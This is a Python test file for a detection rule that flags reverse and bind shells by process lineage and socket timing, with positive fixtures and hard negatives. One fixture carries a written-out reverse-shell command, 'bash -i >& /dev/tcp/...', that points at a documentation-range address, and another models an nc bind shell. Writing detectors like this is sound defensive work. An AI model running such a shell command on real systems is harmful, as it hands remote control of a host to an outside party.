"""Fixtures for the reverse-shell-by-lineage rule (BL-02).

A connecting (or accepting) process that then executes a shell under the same lineage is the shape
every reverse shell shares. Hosts, PIDs, accounts and paths are invented; addresses use the
documentation ranges, never any evaluation dataset's values.
"""
from datetime import UTC, datetime, timedelta

from romulus.detect.lineage import MAX_GAP, ReverseShellByLineage
from romulus.detect.registry import ALL_PLAYBOOKS, fresh_pack
from romulus.evidence.typed import Outcome, RawRef, TypedEvent, fv

T0 = datetime(2030, 3, 1, 12, 0, tzinfo=UTC)
EXT = "203.0.113.9"
_n = 0


def _ev(family, ts, outcome=Outcome.success, host="app01", **fields):
    global _n
    _n += 1
    f = {k.replace("__", "."): fv(v, f"fx{_n}:{k}") for k, v in fields.items() if v is not None}
    return TypedEvent(id=f"e{_n:05d}", family=family, ts=ts, host=host, outcome=outcome, fields=f,
                      raw=[RawRef(target="fx", native_id=f"r{_n}")], normalizer="fixture")


def exc(exe, pid, ts, *, ppid=None, argv=None, user=None, outcome=Outcome.success, host="app01", boot=None):
    return _ev("process_exec", ts, outcome=outcome, host=host, process__executable=exe, process__pid=pid,
               process__ppid=ppid, process__argv=argv or [exe], process__user=user, host__boot__id=boot)


def sock(syscall, pid, ts, *, ip=EXT, port=4444, exe="/usr/bin/python3", user=None,
         outcome=Outcome.success, host="app01", boot=None):
    side = "destination" if syscall == "connect" else "source"
    fields = {"socket.syscall": syscall, "process.pid": pid, "process.executable": exe,
              "process.user": user, "host.boot.id": boot, f"{side}.ip": ip, f"{side}.port": port}
    return _ev("net_socket", ts, outcome=outcome, host=host, **{k.replace(".", "__"): v for k, v in fields.items()})


def run(*partitions):
    pb = ReverseShellByLineage()
    store = {}
    for part in partitions:
        assert pb.consume(list(part)) == []
        for event in pb.drain_staged():
            store[event.id] = event
    pb.bind_loader(lambda ids: [store[i] for i in ids if i in store])
    return pb, pb.finalize()


# ---------------------------------------------------------------- positives
def test_connect_then_in_place_shell_by_web_interpreter_is_high():
    # A www-data python connects out, then re-execs a shell in the same PID: a reverse shell.
    events = [
        exc("/usr/bin/python3", 500, T0, user="www-data"),
        sock("connect", 500, T0 + timedelta(seconds=1), user="www-data"),
        exc("/bin/bash", 500, T0 + timedelta(seconds=2), user="www-data"),
    ]
    _pb, out = run(events)
    assert len(out) == 1
    m = out[0]
    assert m.proposed_lane == "high" and m.severity == "critical" and m.confidence == "high"
    assert f"connected out to external address {EXT}" in m.claim
    assert "own process re-exec" in m.claim and "inferred from lineage and timing" in m.claim
    assert "T1059.004" in m.notes and m.group_key == f"app01|None|500|{EXT}"
    assert any(e.family == "net_socket" for e in m.events) and any(e.family == "process_exec" for e in m.events)
    assert all(p.origin for p in m.predicate)


def test_accept_then_child_shell_by_non_sshd_listener_is_a_bind_shell():
    # nc listens, accepts an external peer, then spawns a child /bin/sh: a bind shell (not an SSH login).
    events = [
        exc("/usr/bin/nc", 600, T0, ppid=1),
        sock("accept", 600, T0 + timedelta(seconds=1), ip="198.51.100.5", port=1234, exe="/usr/bin/nc"),
        exc("/bin/sh", 601, T0 + timedelta(seconds=2), ppid=600),
    ]
    _pb, out = run(events)
    assert len(out) == 1 and out[0].proposed_lane == "high"
    assert "accepted an inbound connection from external address 198.51.100.5" in out[0].claim
    assert "descendant" in out[0].claim


def test_devtcp_redirect_raises_a_non_interpreter_owner_to_high():
    # A plain daemon connects, then a descendant `sh -c` carries a /dev/tcp redirect: the redirect,
    # not the owner's identity, raises the lane to high.
    events = [
        exc("/usr/sbin/myd", 700, T0, ppid=1),
        sock("connect", 700, T0 + timedelta(seconds=1), exe="/usr/sbin/myd"),
        exc("/bin/bash", 701, T0 + timedelta(seconds=2), ppid=700,
            argv=["bash", "-c", f"bash -i >& /dev/tcp/{EXT}/4444 0>&1"]),
    ]
    _pb, out = run(events)
    assert len(out) == 1 and out[0].proposed_lane == "high"
    assert "redirects to or from a /dev/tcp pseudo-path" in out[0].claim


def test_plain_descendant_shell_from_ssh_client_is_a_lead():
    # An ssh client (not web, not an interpreter) connects then spawns a local shell with no /dev/tcp
    # redirect: a real benign lookalike, surfaced as a lead with the reason stated.
    events = [
        exc("/usr/bin/ssh", 800, T0, ppid=1),
        sock("connect", 800, T0 + timedelta(seconds=1), exe="/usr/bin/ssh", port=22),
        exc("/bin/sh", 801, T0 + timedelta(seconds=2), ppid=800),
    ]
    _pb, out = run(events)
    assert len(out) == 1 and out[0].proposed_lane == "lead" and out[0].confidence == "medium"
    assert any("lane lead" in n for n in out[0].notes)


# ---------------------------------------------------------------- hard negatives
def test_sshd_accept_then_login_shell_is_excluded_as_an_ssh_login():
    events = [
        exc("/usr/sbin/sshd", 900, T0, ppid=1),
        sock("accept", 900, T0 + timedelta(seconds=1), ip="198.51.100.5", port=50022, exe="/usr/sbin/sshd"),
        exc("/bin/bash", 901, T0 + timedelta(seconds=2), ppid=900),
    ]
    _pb, out = run(events)
    assert out == []


def test_internal_destination_is_not_a_reverse_shell():
    events = [
        exc("/usr/bin/python3", 500, T0, user="www-data"),
        sock("connect", 500, T0 + timedelta(seconds=1), ip="10.0.0.9", user="www-data"),
        exc("/bin/bash", 500, T0 + timedelta(seconds=2), user="www-data"),
    ]
    _pb, out = run(events)
    assert out == []


def test_failed_connect_does_not_own_a_socket():
    events = [
        exc("/usr/bin/python3", 500, T0, user="www-data"),
        sock("connect", 500, T0 + timedelta(seconds=1), user="www-data", outcome=Outcome.failure),
        exc("/bin/bash", 500, T0 + timedelta(seconds=2), user="www-data"),
    ]
    _pb, out = run(events)
    assert out == []


def test_a_connection_after_the_shell_does_not_join():
    events = [
        exc("/usr/bin/python3", 500, T0, user="www-data"),
        exc("/bin/bash", 500, T0 + timedelta(seconds=2), user="www-data"),
        sock("connect", 500, T0 + timedelta(seconds=5), user="www-data"),   # after the shell exec
    ]
    _pb, out = run(events)
    assert out == []


def test_gap_beyond_the_bound_does_not_join():
    events = [
        exc("/usr/bin/python3", 500, T0, user="www-data"),
        sock("connect", 500, T0 + timedelta(seconds=1), user="www-data"),
        exc("/bin/bash", 500, T0 + timedelta(seconds=MAX_GAP + 10), user="www-data"),
    ]
    _pb, out = run(events)
    assert out == []


def test_socket_exactly_at_the_shell_exec_time_is_outside_the_window():
    # Boundary: the window is [owner exec, shell exec); a socket at the shell's exec time is excluded,
    # one an instant before it joins.
    boundary = [
        exc("/usr/bin/python3", 500, T0, user="www-data"),
        sock("connect", 500, T0 + timedelta(seconds=2), user="www-data"),      # == shell ts
        exc("/bin/bash", 500, T0 + timedelta(seconds=2), user="www-data"),
    ]
    _pb, out = run(boundary)
    assert out == []
    joins = [
        exc("/usr/bin/python3", 500, T0, user="www-data"),
        sock("connect", 500, T0 + timedelta(seconds=2) - timedelta(milliseconds=1), user="www-data"),
        exc("/bin/bash", 500, T0 + timedelta(seconds=2), user="www-data"),
    ]
    _pb, out = run(joins)
    assert len(out) == 1


def test_shell_exec_without_a_pid_is_partial_not_a_clean_negative():
    pb = ReverseShellByLineage()
    pb.consume([exc("/bin/bash", None, T0, user="www-data")])
    assert pb.missing_required >= 1


def test_socket_without_an_executable_is_partial_not_a_clean_negative():
    pb = ReverseShellByLineage()
    pb.consume([_ev("net_socket", T0, socket__syscall="connect", process__pid=500,
                    destination__ip=EXT, destination__port=4444)])
    assert pb.missing_required >= 1


# ---------------------------------------------------------------- determinism and registration
def test_determinism_across_partition_order():
    events = [
        exc("/usr/bin/python3", 500, T0, user="www-data"),
        sock("connect", 500, T0 + timedelta(seconds=1), user="www-data"),
        exc("/bin/bash", 500, T0 + timedelta(seconds=2), user="www-data"),
    ]
    _pb, a = run(events)
    _pb, b = run(list(reversed(events)))
    _pb, c = run(events[:1], events[1:2], events[2:])
    assert a[0].claim == b[0].claim == c[0].claim
    assert a[0].group_key == b[0].group_key == c[0].group_key


def test_rule_is_registered_positive_only_and_staged_with_valid_attack_ids():
    cls = ReverseShellByLineage
    assert cls in ALL_PLAYBOOKS and not cls.assures_negative and cls.positive_only_reason
    assert any(isinstance(pb, cls) for pb in fresh_pack())
    assert cls.staged and cls.kind == "aggregate"
    import gzip
    import json
    from pathlib import Path
    with gzip.open(Path(__file__).resolve().parents[1] / "content/attack/enterprise-attack-20.0.json.gz") as fh:
        stix = json.load(fh)
    ids = {ref["external_id"] for obj in stix["objects"] if obj.get("type") == "attack-pattern"
           and not obj.get("revoked") and not obj.get("x_mitre_deprecated")
           for ref in obj.get("external_references", []) if ref.get("source_name") == "mitre-attack"}
    assert set(cls.attack) <= ids
